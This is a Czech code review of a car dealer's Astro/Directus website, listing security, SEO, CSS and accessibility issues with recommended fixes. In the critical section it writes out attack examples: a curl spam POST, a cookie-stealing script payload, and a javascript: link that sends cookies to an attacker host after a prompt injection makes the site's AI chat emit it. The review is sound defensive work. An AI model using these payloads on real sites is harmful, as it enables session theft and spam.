# Code Review — SFR Motor Web (2026-05)

> Scope: full pass přes `web/src/**` (Astro 5 + Directus + Vercel). Konkrétní soubory + řádky, doporučení popisně (NE kód). Tříděno dle priority. **Žádné fixy nebyly aplikovány.**

---

## TL;DR

- **Kritické (must fix před live)**: 6
- **Vysoká priorita**: 14
- **Střední**: 17
- **Nice-to-have / future**: 11

Hlavní rizika:
1. Lead formuláře posílají přímo do Directus z prohlížeče → kdokoli na internetu může spamovat `/items/leads` POST přímým curl (honeypot/captcha jen v prohlížeči, server nevynucuje nic).
2. `marked.parse()` výsledky idou přes `set:html=` bez sanitizace ve dvou místech — `promo_description` (admin field) i article body. AI chat `markdownToHtml` přijme `javascript:` URL.
3. Footer odkazuje na 6 stránek, které neexistují (404).
4. Žádné `<link rel="canonical">`, `trailingSlash: 'ignore'` → duplicitní URL pro SEO.
5. Static-mode redirecty (`Astro.redirect('/404')` ve [slug].astro) negenerují HTTP 404, ale meta-refresh / 302.
6. Hardcoded fallback `directus-production-3e67.up.railway.app` v API endpointech a admin stránce — odhalený production URL admin Directusu.

---

## Critical issues

### 1) Lead form bypass: anonymous POST na Directus `/items/leads`
**STATUS: ✅ RESOLVED 2026-05-19**
- `/api/lead.ts` SSR endpoint (rate limit 10/den/IP, honeypot, server-side validace)
- Cloudflare Turnstile invisible (non-strict fallback)
- Lead Writer role v Directus s pouze `create` permission
- Public role: `leads` Create + Read = **No Access**
- Refactor 5 forms (kontakt, servis, sklad detail, LeadForm component, AI chat)
- VIN/model/brand kontext v leads
- GDPR checkbox sjednocený

**Co (původní problém)**: Všechny lead formy (`sklad/[id].astro:1093`, `kontakt.astro:188`, `servis.astro`, `components/LeadForm.astro:100`, `components/ModelChatWidget.astro` přes API) posílaly JSON přímo na `${DIRECTUS_URL}/items/leads` z prohlížeče.

**Proč problém**:
- Honeypot kontrola (`_hp_website`) běží POUZE v prohlížeči. Útočník/bot, který nezná HTML formy, jen pošle `curl -X POST https://directus.../items/leads -d '{...}'` a Directus to přijme.
- Bez rate-limitu (víc requestů z jedné IP = 1000 leadů za minutu).
- Bez serverové validace (Directus collection `leads` musí mít public-write permissions, jinak by to nefungovalo — což znamená že Directus přijme cokoliv).
- Žádné CAPTCHA, žádné CSRF token.

**Soubory**: `web/src/components/LeadForm.astro:97-164`, `web/src/pages/sklad/[id].astro:1092-1126`, `web/src/pages/kontakt.astro:186-220`, `web/src/pages/servis.astro` (form), všechny fcardy.

**Fix popisně**: Přesunout odeslání na vlastní Astro API endpoint `/api/lead` (SSR, `prerender = false`). Endpoint:
- vynucuje honeypot + IP rate-limit (stejně jako `chat/model.ts`)
- validuje jméno/email/telefon na serveru
- volá Directus s server-side static tokenem (`DIRECTUS_STATIC_TOKEN`), Directus collection má anonymous write zakázanou
- volitelně Turnstile/reCAPTCHA pro vysokou hrubou silou

---

### 2) `marked.parse()` → `set:html` bez sanitizace
**STATUS: ✅ RESOLVED 2026-05-19**
- Nový helper `src/lib/sanitize.ts` (wrapper kolem `isomorphic-dompurify`)
- `sanitizeHtml()` — pro články (povoluje p, a, ul, table, img...)
- `sanitizeHtmlStrict()` — pro AI chat (jen základní inline formátování)
- `model/[slug].astro:promo_description` — sanitizováno přes `sanitizeHtml`
- `magazin/[slug].astro:article.body` — sanitizováno přes `sanitizeHtml`
- ALLOWED_URI_REGEXP blokuje `javascript:`, `data:`, `vbscript:` schémata

**Co (původní problém)**:
- `model/[slug].astro:419-423` — `promo_description` z Directusu, `marked.parse()` → `set:html={promoDescriptionHtml}` na řádku 539.
- `magazin/[slug].astro:81-88` — `article.body` přes `marked.parse()` → `set:html={wrappedHtml}` (řádek 148).

**Proč problém**: `marked@14` nemá vestavěnou sanitizaci (sanitize option zrušena ve v8). Pokud kdokoliv s Directus přístupem (nebo XSS přes Directus admin) napíše `<script>alert(document.cookie)</script>` do article body / promo description, vykreslí se to v prohlížeči návštěvníka.

**Fix popisně**: Po `marked.parse()` projet výstup přes DOMPurify (na clientu) nebo isomorphic-dompurify (Node během build/SSR). Nebo restriktivnější marked renderer + escape unsafe tagů. Pro promo_description, kde je obsah jednoduchý text + bold/odkazy, by stačila vlastní mini-markdown funkce.

---

### 3) AI chat `markdownToHtml`: `javascript:` URL injection
**STATUS: ✅ RESOLVED 2026-05-19**
- `isSafeUrl()` whitelist: jen `http://`, `https://`, `mailto:`, `tel:`, relativní URLs
- `escapeAttr()` escape href hodnoty (závorky, ampersandy, atd.)
- Nepovolené URL (např. `javascript:`) → render jako plain text `[label](url)`, ne aktivní link
- Plus `rel="noopener noreferrer"` na externí target=_blank (řeší tabnabbing)

**Co (původní problém)**: `components/ModelChatWidget.astro:142-157` — funkce `markdownToHtml` nejdřív escapuje vstup, ale pak našla markdown linky a vložila **neescapované** `url` do `href="${url}"`.

**Proč problém**:
- AI z prompt injection může vrátit `[Klikni sem](javascript:fetch('https://attacker.com?'+document.cookie))` → render do DOM s funkčním JS URL.
- `url.includes('sfr-motor')` jen rozhoduje target=_blank, neblokuje schéma.
- Stejně tak `data:` URL nebo neformované URL můžou rozbít atribut (`url` může obsahovat `"`).

**Fix popisně**: Po extrakci URL z markdown linku validovat scheme: pouze `http(s)://`, `mailto:`, `tel:` a relativní `/...`. Cokoli jiného → vykreslit jako plain text, nebo aspoň href přepsat na `#`. Plus escape `url` přes escapeHtml před vložením do atributu.

---

### 4) Broken footer links → 404 storm
**Co**: `components/Footer.astro:52-66` linkuje na `/o-nas`, `/kariera`, `/partneri`, `/informace/podminky`, `/informace/ochrana-udaju`, `/informace/cookies`.

**Soubory v `pages/`**: žádný z těchto neexistuje (potvrzeno `Glob web/src/pages/**/*.astro`).

**Proč problém**:
- Každá stránka webu vykresluje tyhle linky v patičce → konstantní 404 hits v analytics.
- GDPR a obchodní podmínky **musí** existovat (právní povinnost).
- `Disclaimer` komponenta i lead formuláře odkazují na `/informace/ochrana-udaju` → každý submit má broken consent link.

**Fix popisně**: Buď vytvořit alespoň minimální stránky (GDPR, obchodní podmínky, cookies), nebo skrýt nefunkční odkazy v Footer dokud nejsou hotové. Astro routes pro `/o-nas`, `/kariera`, `/partneri` nejsou kritické — můžou pryč.

**STATUS: ✅ RESOLVED 2026-05-20**
Vytvořena editovatelná Directus kolekce `pages` (slug, title, body md, status, section) + seed skript `scripts/add-legal-pages.mjs`. Vznikl sdílený komponent `StaticPage.astro` a všech 6 stránek: `/informace/cookies`, `/informace/ochrana-udaju`, `/informace/podminky` (section=informace přes `pages/informace/[slug].astro`) a `/o-nas`, `/kariera`, `/partneri` (section=standalone, named routes). Footer i consent odkaz v lead formulářích (`/informace/ochrana-udaju`) teď resolvují — 404 storm vyřešen. Obsah editovatelný v `/admin/content/pages`.

---

### 5) Žádné canonical URLs + `trailingSlash: 'ignore'`
**Co**: `astro.config.mjs:11` má `trailingSlash: 'ignore'`. `BaseLayout.astro:42-86` nikdy nenastaví `<link rel="canonical">`.

**Proč problém**:
- Google indexuje `/sklad`, `/sklad/`, případně `/Sklad` jako 3 různé stránky.
- Bez canonical nedáváme search engineu signál o preferované verzi.
- `[brand].astro`, `model/[slug].astro`, `sklad/[id].astro`, `magazin/[slug].astro` — všechny generují JSON-LD se správnou URL, ale HTML neukazuje canonical.

**Fix popisně**: V `BaseLayout.astro` přidat povinný prop `canonicalUrl` (nebo automatický z `Astro.url.pathname` + site URL) a vykreslit `<link rel="canonical" href={...}>`. Zvážit `trailingSlash: 'never'` a redirecty.

**STATUS: ✅ RESOLVED 2026-05-20**
`BaseLayout.astro` teď generuje canonical automaticky: `Astro.site` (`https://sfr-motor.cz`) + `Astro.url.pathname` normalizovaný (strip koncového lomítka, vyjma rootu) → `<link rel="canonical">` + `<meta property="og:url">`. Přidán volitelný prop `canonical` pro override (paginace/filtry). `trailingSlash` ponecháno na `'ignore'` záměrně — normalizovaný canonical řeší dedup bez rizika redirectů; flip na `'never'` lze udělat později, pokud bude potřeba tvrdé přesměrování.

---

### 6) Hardcoded Directus admin URL v kódu
**Co**: `pages/admin/cenik.astro:15`, `pages/api/cenik/save.ts:34`, `pages/api/cenik/analyze.ts` (pravděpodobně) všechny mají:
```
const DIRECTUS_URL = import.meta.env.PUBLIC_DIRECTUS_URL || 'https://directus-production-3e67.up.railway.app';
```

**Proč problém**:
- URL leakuje admin endpoint v public bundle.
- Pokud env proměnná na Vercelu chybí, fallback ji prozradí (i s Railway hostingem).
- Také `directus-production-3e67.up.railway.app` zní jako produkční instance — útočník má rovnou cíl pro brute-force loginu nebo dependency vulnerabilities scan.

**Fix popisně**: Odstranit fallback, ať explicitně failuje (vyhodit error). Případně mít neutrální fallback `https://localhost` (jen pro lokální dev), produkce musí mít env nastavenou.

**STATUS: ✅ RESOLVED 2026-05-20**
Railway fallback odstraněn ve všech 3 souborech (`admin/cenik.astro:15`, `api/cenik/save.ts:34`, `api/cenik/analyze.ts:231`) → sjednoceno na `import.meta.env.PUBLIC_DIRECTUS_URL ?? import.meta.env.DIRECTUS_URL ?? ''` (stejný vzor jako `lib/directus.ts`). Ověřeno grepem: žádný `railway.app` v `src/`. Produkce musí mít `PUBLIC_DIRECTUS_URL` nastavenou na Vercelu (Render URL) — což má.

---

## High priority

### 7) `Astro.redirect('/404')` v static-mode souborech negeneruje HTTP 404
**Co**: `sklad/[id].astro:66, 101`, `model/[slug].astro:69, 75`, `magazin/[slug].astro:48` — `Astro.redirect('/404')` ve souborech bez `export const prerender = false`.

**Proč problém**: V `output: 'static'` mode Astro neumí runtime redirect — v praxi vygeneruje meta-refresh nebo prázdnou stránku. Google to indexuje jako 200 OK redirecting nebo i jako "soft 404" — penalty.

**Fix popisně**: Buď přepnout daný route na SSR (`export const prerender = false`) a vracet `new Response(null, { status: 404 })`, nebo na úrovni getStaticPaths zaručit, že se generují jen existující URL (a vse ostatní spadne přes Astro 404.astro automaticky).

---

### 8) `Astro.redirect` v `[brand].astro` při neexistujícím brandu
**Co**: `[brand].astro:31-33` — fallback na `/404` redirect. Stejný problém jako #7.

---

### 9) `output: 'static'` + API routes mix — Vercel adapter SSR confusion
**Co**: `astro.config.mjs:9` říká `output: 'static'`, ale máme API routes (`api/chat/model.ts`, `api/cron/backup.ts`, `api/cenik/*`) které potřebují SSR. Vercel adapter to umí, ale doporučované je `output: 'hybrid'` pro tento mix.

**Proč problém**: 
- Konfigurace nejasná. Při kontrole nového vývojáře přidání SSR routy = matení.
- Komentář v configu říká "individual routes opt-in to SSR" což funguje, ale není to "static" pak.

**Fix popisně**: Přepnout na `output: 'hybrid'` (Astro 4) nebo `output: 'server'` + označit prerenderable stránky.

---

### 10) Inline `<script>window.dataLayer = …</script>` v `<head>` blokuje render
**Co**: `BaseLayout.astro:85` — inline GTM placeholder bez `defer`/`async`.

**Proč problém**: Jednoduchý jednořádkový skript, ale principiálně by měl být v `<body>` nebo s `defer`. Také pak `if (window.dataLayer)` checks v ostatních souborech jsou validní, ale dataLayer je deklarován v každé stránce znovu — duplicity.

**Fix popisně**: Přesunout do externího JS / inline po `<body>`, nebo přidat `defer` atribut a wrapnout do funkce.

---

### 11) Backup API endpoint dělá Blob `access: 'public'`
**Co**: `pages/api/cron/backup.ts:111` — Vercel Blob `access: 'public'` a vrátí URL v response. Komentář říká "secret-by-URL".

**Proč problém**:
- "Security through obscurity". Pokud útočník získá zalogovanou URL (z Vercel logs leaky, z error tracking, ze sdíleného linku) → má kompletní DB dump včetně `leads` (PII), `employees`, atd.
- Backupy obsahují citlivá data zákazníků.

**Fix popisně**: Použít `access: 'private'` Blob, nebo upload na S3 s server-side encryption a krátkou expiration. Backup URL nikdy nevypisovat v response (jen blob ID).

---

### 12) Chat API rate-limiter ztrácí stav mezi serverless invocations
**Co**: `api/chat/model.ts:42` — `rateLimitStore = new Map(...)` v paměti.

**Proč problém**:
- Komentář to upřímně přiznává, ale dopad: Vercel točí instance, jedna IP může poslat 20 zpráv na instanci A, 20 na B, atd. Reálný limit je n×20.
- AI volání jsou drahá → 100 zpráv/hod z útočníka = nezanedbatelný Anthropic účet.

**Fix popisně**: Použít Upstash Redis nebo Vercel KV pro shared rate-limiter (sotva 100 řádků kódu). Druhá ochrana: tvrdý token quota check (denní limit na celý web).

---

### 13) Hero video bez `prefers-reduced-motion` respektu
**Co**: `model/[slug].astro:454-470` — `<video autoplay muted loop>` a JS force-play v `Header.astro`/`model[slug].astro:1249-1269`.

**Proč problém**:
- Lidé s vestibulárními problémy nebo focus disability mají v OS `prefers-reduced-motion: reduce`. Web by měl autoplay zakázat.
- iOS Low Power mode autoplay odmítne tak jako tak, ale na desktopu video sviští nezávisle na prefenci.

**Fix popisně**: V JS check `window.matchMedia('(prefers-reduced-motion: reduce)').matches` před `tryPlay`, ev. ne přidávat `autoplay` atribut renderem. CSS `@media (prefers-reduced-motion)` paty/animace už dělá Header, ale ne video.

---

### 14) Sticky CTA z-index conflict s mobile nav
**Co**: `.sticky-cta` z-index 70 (řádek 4496 nebo blízko), `.nav` z-index 50. Na mobile je nav `position: fixed`. Když uživatel scrolluje a nav je vidět, sticky CTA jde "skrz" nav (sticky 70 > nav 50).

V `global.css:4568` to vypnou `.sticky-cta { display: none }` na mobile (max-width 960). OK, ale **mobile bottom bar** (`.mbb` z-index 70 řádek 4496) i `.subnav` (z-index 45 řádek 1678) — když je drawer otevřený (`.mobile-drawer` z 200, backdrop z 190), funguje OK.

**Problém**: Chat widget z-index 1000 (`ModelChatWidget.astro:290`) přebíjí mobile drawer 200 — když otevřu drawer na mobilu na model stránce, chat tlačítko zůstane vidět nad drawer. Vizuálně rozbité.

**Fix popisně**: Snížit `.chat-widget` z-index nebo skrýt `.chat-widget` když je `.mobile-drawer.is-open` přes JS / CSS sibling selector.

---

### 15) Subnav `top: 76px` desktopu kolize s mobile fixed nav
**Co**: `global.css:1675-1681` — `.subnav { position: sticky; top: 76px }`. Mobile media query (4576) přepíše na `top: 64px`. **Ale** mobile nav je `position: fixed`, takže subnav uvnitř sticky parent pozici se vypočítá jen vzhledem k viewportu — ne "pod nav". Když je nav scrollován pryč (transform: translateY(-100%)), subnav stále má `top: 64px` = visí pod neexistujícím navem.

**Fix popisně**: Použít CSS custom property `--nav-height` a propojit JS, nebo subnav přepnout na `position: fixed` s `top: calc(64px - var(--nav-offset))` synchronizovaným s JS scroll handler.

---

### 16) CSS proměnné `--bg-card`, `--success` nedefinované
**Co**: `components/LeadForm.astro:71, 89, 94` — používá `var(--bg-card)` a `var(--success)`, ale v `global.css:1-35` definováno není (`--ok` existuje, ne `--success`).

**Proč problém**: Fallback (bez druhého argumentu) → `background: transparent`. LeadForm vypadá rozbitě (žádné pozadí, žádný success color).

**Fix popisně**: Buď přidat aliasy `--bg-card: #fff; --success: var(--ok);` do global.css, nebo přepsat LeadForm na existující proměnné. (Pozor: LeadForm.astro **se prakticky používá**? Jiné stránky používají custom `.fcard` HTML — možná je LeadForm dead code.)

---

### 17) DirectusImage chybí `width`/`height` atributy → CLS
**Co**: `components/DirectusImage.astro:67-87` — žádný `width`/`height` attr na `<img>`, jen CSS `aspect-ratio` (pokud prop dodán).

**Proč problém**: 
- Browser nezná intrinsic dimensions → layout shift při loadingu.
- `loading="lazy"` images bez explicit dims jsou Lighthouse penalty.
- Aspect-ratio jen v style atributu — bez známé šířky browser nemůže rezervovat prostor předtím než CSS vyhodnotí.

**Fix popisně**: Pokud je `widths` prop, dodat `width={widths[1]} height={ aspect ratio compute }` atributy na `<img>`. Pro `fill` mode použít přirozené dims placeholder. Plus `decoding="async"` už máš.

---

### 18) Body scroll lock přes `document.body.style.overflow = 'hidden'`
**Co**: `Header.astro:122, 131`, `sklad/[id].astro:1055, 1062`, `model/[slug].astro:1221, 1229`.

**Proč problém**: 
- iOS Safari ignoruje `overflow: hidden` na body (jumping scroll). Mainstream řešení je `position: fixed` na `<body>` + uchování scroll pozice.
- Pokud uživatel otevře drawer pak chat widget, nebo gallery — `overflow` se vícekrát setne/odsetne a uzavření jednoho odemkne body, i když jiný overlay je stále otevřený.

**Fix popisně**: Centralizovaná `useScrollLock` třída (counter-based). Pro iOS friendly variantu použít body-scroll-lock npm package nebo vlastní s `position: fixed`.

---

### 19) Backdrop-filter chybí `-webkit-` prefix
**Co**: `global.css:391` (`.gallery-counter`), `4227`, `4832` — používají `backdrop-filter: blur(...)` bez `-webkit-backdrop-filter`.

**Proč problém**: Safari pre-18 vyžaduje `-webkit-` prefix. Bez něj na iOS < 18 a macOS Safari 15-16 vůbec nefunguje blur.

**Fix popisně**: Přidat `-webkit-backdrop-filter: blur(8px)` před `backdrop-filter` na všech 3 místech. `global.css:3408-3409` to dělá správně (počítadlo galerie modal counter má prefixed varianta).

---

### 20) `outline: none` na inputech bez visible alternative = a11y violation
**Co**: `global.css:1272`, `global.css:4321`, `sklad/index.astro:417`, `admin/cenik.astro:147`, `ModelChatWidget.astro:555` — všude `outline: none` na `:focus`.

**Proč problém**: Klávesnice uživatelé nevidí kam navigují. WCAG 2.2 SC 2.4.7 (Focus Visible) — porušení.

**Fix popisně**: Místo `outline: none` použít `outline: 2px solid var(--accent); outline-offset: 2px;` nebo `box-shadow: 0 0 0 3px rgba(...)`. Lépe — vůbec nesetovat `outline: none` a customizovat default focus ring přes `:focus-visible`.

---

## Medium priority

### 21) CSS selector injection v sklad index URL params
**Co**: `pages/sklad/index.astro:325, 353, 378, 385` — `querySelector(\`option[value="${modelParam}"]\`)` s `modelParam` z URL `?model=`.

**Proč problém**: 
- Pokud někdo otevře `/sklad?model="]/[a]`, selektor je `option[value=""]/[a]"]` — querySelector vyhodí exception, JS se rozsype, filtry přestanou fungovat.
- Není to XSS (pouze přijímá string, nepíše do DOM), ale UX bug + crash.

**Fix popisně**: Validovat `brandParam`/`modelParam` proti známé whitelistu (znát modely a značky z renderu) nebo escape přes `CSS.escape()`.

---

### 22) `e.target.value` a `el.dataset.name` bez null check v event handlerech
**Co**: Sklad filtry (`sklad/index.astro:336-389`) přistupují k `.checked`, `.value`, `.dataset.brand` na elementech bez TypeScript safety. Astro JSX = JS, takže žádné TS errors, ale runtime může chytit `Cannot read property 'value' of null` na exotických prohlížečích nebo race conditions.

**Proč problém**: Pokud DOM ještě není ready (např. View Transitions API navigace), handlery se navážou na neexistující elementy.

**Fix popisně**: Wrapovat do `DOMContentLoaded` / `defer` script, kontrolovat existenci elementů (`if (!grid) return` už máte, ale ne všude).

---

### 23) Vehicle JSON-LD `priceFromCzk` 0 nebo undefined → broken offer
**Co**: `lib/schemas.ts:207-217` — `offers: v.priceCzk ? {...} : undefined`. Pokud cena chybí (na dotaz), žádné offers. To je OK pro neoznámené, ale `availability: 'sold_out'` by Google chtěl i bez ceny.

**Fix popisně**: I bez ceny vykreslit offers s `availability` a `priceSpecification: { price: 0, priceCurrency: 'CZK' }` placeholder.

---

### 24) WebSite schema má broken SearchAction template
**Co**: `lib/schemas.ts:326` — `target: ${SITE_URL}/sklad?q={search_term_string}`. Stránka `/sklad` nemá search input `q=`. Google rich snippet "sitelinks searchbox" tedy nefunguje (Google vyzkouší a najde že nic není).

**Fix popisně**: Implementovat search query (`q=` URL param v `sklad/index.astro` JS), nebo schema odstranit.

---

### 25) Hardcoded magic numbers — chybí CSS custom properties
**Co**: 
- Nav height: 76px desktop / 64px mobile — opakuje se v subnav top, body padding-top, calc na ModelChatWidget mobile.
- Mobile bottom bar height: 72px — opakuje se v chat-widget calc.
- Subnav top: 76px / 64px duplikuje nav height.

**Soubory**: `global.css:124`, `1677`, `Header.astro:210`, `ModelChatWidget.astro:585-606`.

**Proč problém**: Při změně nav height musíš najít a změnit 6 míst.

**Fix popisně**: Přidat CSS proměnné `:root { --nav-height: 76px; --nav-height-mobile: 64px; --mobile-bottom-bar: 72px; --subnav-height: 64px; }` a používat všude.

---

### 26) Inconsistent breakpoints
**Co**: `global.css` má media queries: 480, 520, 600, 640, 700, 720, 960, 961, 1100.

**Proč problém**: 
- 700-960px gap je nepokrytý (tablet portrait).
- 960/961 nesouhlasné — pokud někdo má viewport přesně 960px, oba selektory match (960 max-width, 961 min-width). Hraniční bug.
- 700-720px overlap.

**Fix popisně**: Definovat 4-5 standardních breakpointů (mobile ≤480, mobile-l ≤700, tablet ≤960, desktop ≤1100, large >1100) a stickovat se. Refactor `global.css` v jedné dávce.

---

### 27) `image` v astro.config bez `domains` whitelist
**Co**: `astro.config.mjs:17-20` — `image` službu sharp, ale žádné `domains` ani `remotePatterns` pro Directus images.

**Proč problém**: Astro `<Image>` komponentou bys mohl využít optimalizaci Directus assetů, ale aktuálně se používá vlastní `DirectusImage` komponenta (parametr URL na Directus) a native `<img>`. Když by se nad ní postavil Astro `<Image>` se srcsetem a remote URL, padl by build.

**Fix popisně**: Pokud chceš Astro image optimization na Directus URLs, přidat `image.domains: ['directus-production-3e67.up.railway.app']`. Jinak ignorovat.

---

### 28) `text-wrap: balance` bez fallbacku
**Co**: `global.css:67` — všechny H1-H5 mají `text-wrap: balance`.

**Proč problém**: Safari < 17.5, Chrome < 114, Firefox < 121 to ignorují (87% global support 2026-05). Není to bug — text se prostě nezbalancuje, ale layout je OK.

**Status**: Akceptovatelné. Note for awareness.

---

### 29) `color-mix(in srgb, ...)` bez fallbacku
**Co**: `global.css:2962`, `HighlightsPanel.astro:138, 169` — používají `color-mix()`.

**Proč problém**: Safari 16.4+, Chrome 111+, Firefox 113+ (cca 92% global 2026-05). Starší Safari = neplatné CSS, fallback je inherit/transparent.

**Fix popisně**: Před `color-mix(...)` deklarovat fallback `box-shadow: 0 18px 44px -14px rgba(0,0,0,0.3);` a pak `box-shadow: 0 18px 44px -14px color-mix(...);` — browser bez podpory přečte první, novější druhý.

---

### 30) `100vh` na ModelChatWidget bez `dvh` fallbacku
**Co**: `ModelChatWidget.astro:322, 604, 605`.

**Proč problém**: Na iOS Safari je `100vh` výška viewportu **s** adresním řádkem (větší než realita). Chat panel přesáhne viditelnou plochu a tlačítka jsou pod adresním řádkem.

**Fix popisně**: Použít `100dvh` (dynamic viewport height) jako primární, `100vh` jako fallback: `height: 100vh; height: 100dvh;`. Stejně pro `max-height`. `dvh` má 93% support, na nejnovějších Safari/Chrome funguje.

---

### 31) Iframe Google Maps bez `loading="lazy"` consent
**Co**: `kontakt.astro:57-66` — Maps iframe loaded eagerly s `loading="lazy"`. **OK pro performance**, ale Google Maps načítá tracking cookies bez user consent (GDPR concern v ČR/EU).

**Proč problém**: Pokud Maps iframe je nad fold, lazy nepomůže (načte se hned). Cookies tracking start bez souhlasu = GDPR violation.

**Fix popisně**: Před Maps zobrazit consent banner. Nebo načíst Maps placeholder image a teprve po kliknutí iframe. Lepší: Mapbox/OSM bez tracking cookies.

---

### 32) `<a href="javascript:history.back()">` v 404 page
**Co**: `404.astro:81` — Back odkaz s `javascript:` URL.

**Proč problém**: 
- CSP `script-src 'self'` (kdybyste zapnuli) by `javascript:` URL zakázal.
- Mnoho security scannerů to označuje jako XSS pattern false-positive.

**Fix popisně**: Použít `<button type="button" onclick="history.back()">` nebo lépe — JS handler s addEventListener a `<a href="/">` jako fallback (no-JS uživatel získá home).

---

### 33) Marked blockquote `.replace(/<blockquote>/g, ...)` fragile
**Co**: `magazin/[slug].astro:85-88` — replace na rendered HTML.

**Proč problém**: Marked může output `<blockquote\n>` (whitespace), `<ul start="3">` atd. — regex zachytí jen perfectní matching. Custom renderer v marked je čistší řešení.

**Fix popisše**: V `marked.setOptions` definovat custom renderer:
- `renderer.blockquote = (q) => '<blockquote class="pull">${q}</blockquote>'`
- atd.

---

### 34) Hero video poster missing fetchpriority high
**Co**: `model/[slug].astro:465` — poster atribut na `<video>` neumí fetchpriority. Hero image fallback (`DirectusImage` níže) by mohl mít `loading="eager"` + `fetchpriority="high"` (má).

**Status**: Drobné. Performance optimization opportunity for non-video models.

---

### 35) `Math.random()` v "deterministic shuffle" komentář klame
**Co**: 
- `index.astro:435`, `model/[slug].astro:1058`, `[brand].astro` — F5 shuffle používají `Math.random()` (správné, je to runtime).
- `VideoStrip.astro:46-53` — komentář říká "deterministicky-míchaný shuffle" ale používá `Math.random()`. **Bug v komentáři**, ne v kódu (build-time random je OK).

**Fix popisně**: Opravit komentář nebo přidat seed pro skutečný deterministic shuffle.

---

### 36) `transformations` parameter konflikt Directus assets
**Co**: `lib/directus.ts:318-330` — `directusAsset` posílá `?width=...&quality=...` jako URL params. Directus 11 vyžaduje buď `key=` (preset) nebo `transforms=[...]` JSON. Možná to funguje díky legacy support, ale je to deprecated forma.

**Status**: Funguje, ale check Directus 11 release notes.

---

### 37) Lead form `email required + telefon optional` mismatch s server validace
**Co**: 
- `sklad/[id].astro:899-902` — email required, phone has pattern but není required.
- `chat/model.ts:792-805` — server requires name+phone (ne email).

**Proč problém**: AI chat validace přes `submit_lead` tool vyžaduje phone (jméno+telefon povinné). Web form vyžaduje email. Inconsistent UX: některé leady mají phone bez email, jiné email bez phone. CRM-side cleanup pak nedosáhne na všechny.

**Fix popisně**: Sjednotit: email required + phone optional (nebo naopak). Aktualizovat AI chat prompt aby žádal jen jedno.

---

## Nice to have / future

### 38) `dataLayer` push bez consent check
GTM/dataLayer events (`generate_lead`) se posílají bez ověření, že uživatel souhlasil s analytics cookies (žádný consent banner).

### 39) Cron job `backup.ts` retention bug edge case
`cron/backup.ts:120-126` — `cutoff = Date.now() - RETENTION_DAYS * 24 * 60 * 60 * 1000`. Pokud backup byl uploadnut **přesně** v okamžiku cutoff, smaže se. Nepravděpodobné, ale `>` vs `>=` důležité.

### 40) `pdfjs-dist@4.10.38` v deps — v build script?
`package.json` deps obsahuje pdfjs-dist, playwright, turndown, cheerio — to vypadá na server-only knihovny pro ceník/cron. Astro je do client bundle nezahrne, OK. Ale playwright je 700MB+ install — kontrola, že se to nepouští v devDeps?

### 41) `getStaticPaths` na sklad/[id] může explodovat při velkém skladě
Pokud sklad naroste přes ~100 vozů, build time se zvedne (každý dostane svoji statickou stránku). Vercel limit 12 minut Hobby. Threshold: monitor build duration.

### 42) Astro `inlineStylesheets: 'auto'` může způsobit FOUC
`astro.config.mjs:13` — Astro samo rozhodne kdy inline CSS. U 4800+ řádků global.css se rozhodne inline nedělat (přesahuje threshold). OK, ale CLS na první render. Můžeš to vyladit s `inlineStylesheets: 'always'` pro critical above-fold CSS.

### 43) Brand-specific KGM chat widget hardcoded check
`model/[slug].astro:1293` — `{brand.slug === 'kgm' && <ModelChatWidget />}`. Když přidáš chat i pro Omoda/Farizon, najdeš a změníš podmínku. Lépe field `chat_enabled` na brand collection.

### 44) `getReadTime` funkce dead code?
`lib/articles.ts` — pravděpodobně utility pro reading time. Volá se z `magazin/*` ale jestli to funguje s polskou markdown nebo plain text, závisí na čistotě body.

### 45) Hardcoded service prices v homepage
`index.astro:85-90` — fixed list of 4 services with hardcoded prices. Komentář "TODO: load from service_pricing collection" — pamatuj.

### 46) Open Graph image dimensions
`BaseLayout.astro:56` — `og:image` má jen URL, žádné `og:image:width`/`og:image:height`. LinkedIn a Twitter (X) preview cards lépe renderují s dim hints.

### 47) Astro sitemap integration konfigurace
`astro.config.mjs:16` — `integrations: [sitemap()]`. Default config — neexcluduje `/admin/*`. Vercel sitemap by mohla obsahovat admin URL.

### 48) Skip-to-content link missing
Žádný `<a href="#main" class="sr-only">Přeskočit na obsah</a>` v `BaseLayout.astro`. Keyboard users projedou nav každé stránky znova.

---

## Browser compatibility matrix

| Feature | Used in | Browser support (2026-05) | Fallback existuje? |
|---|---|---|---|
| `overflow-x: clip` | `global.css:42-43` (html, body) | 95% (Safari 16+) | Ne. Safari <16 ignoruje → ten horiz scroll. |
| `:focus-visible` | `global.css:269, 899` | 96% (Safari 15.4+) | Ne, ale `:focus` selectors taky existují (chyba: outline: none je všude). |
| `aspect-ratio` | DirectusImage, gallery, multiple | 95% (Safari 15+) | Ne — old Safari nemá výšku, image nedosadí. |
| `color-mix()` | global.css:2962, HighlightsPanel | 92% (Safari 16.4+) | Ne. |
| `backdrop-filter` (3 míst) | gallery-counter atd. | 97% s prefixem | Chybí `-webkit-` na 3 místech → Safari pre-18 bez efektu. |
| `text-wrap: balance` | h1-h5 globally | 87% (Safari 17.5+) | Ne — older Safari ignoruje, layout stejný. |
| `100dvh`/`100svh`/`100lvh` | Nepoužito | — | **Měli byste použít** `100dvh` místo `100vh` v ModelChatWidget. |
| `:has()` | Žádné | — | OK, vyhnuli jste se. |
| `@container` | Žádné | — | OK. |
| `env(safe-area-inset-*)` | global.css:226-227, ModelChatWidget | 97% | OK. |
| `scroll-snap-type` | subnav-inner:1695 | 98% | OK. |
| `inset: 0` | global.css multiple | 96% | Safari 14.1+. |
| `:where()`, `:is()` | Nepoužito | — | OK. |
| `gap` v flex | Multiple | 95% | Safari 14.1+. |
| `position: sticky` | Multiple | 99% | OK, ale `overflow-x: clip` na html/body fixed sticky compat (komentář to popisuje). |
| CSS nesting | Žádné | — | OK. |
| `transform` GPU acceleration | Multiple, `will-change: transform` | OK | — |
| Custom properties (`var(--*)`) | Everywhere | 98% | LeadForm má broken refs (`--bg-card`, `--success`). |
| `vw`/`vh` | Multiple | 99% | OK. |
| `clamp()` | Multiple | 96% | OK. |

---

## Mobile/responsive findings

1. **Sticky CTA z-index conflict s mobile bottom bar a chat widget** — viz #14.
2. **Subnav top off pri scroll-down state na mobile** — viz #15.
3. **Breakpoint gaps**: 700-960px (tablet portrait) málokrát řešený. Karty `.skladovka-grid` jdou z 2 col (700-1100) na 4 col (>1100) bez 3 col mezikroku. — viz #26.
4. **iOS Safari `100vh` v chat panel** — viz #30.
5. **Touch targets sub-44px**: 
   - `.nav-sep` (dot) má font-size 10px — neaktivní, OK.
   - `.subnav-link padding: 22px 18px` — OK.
   - `.btn-icon` (kontaktní ikony) 44×44 OK.
   - `.scard` celá karta clickable — touch friendly.
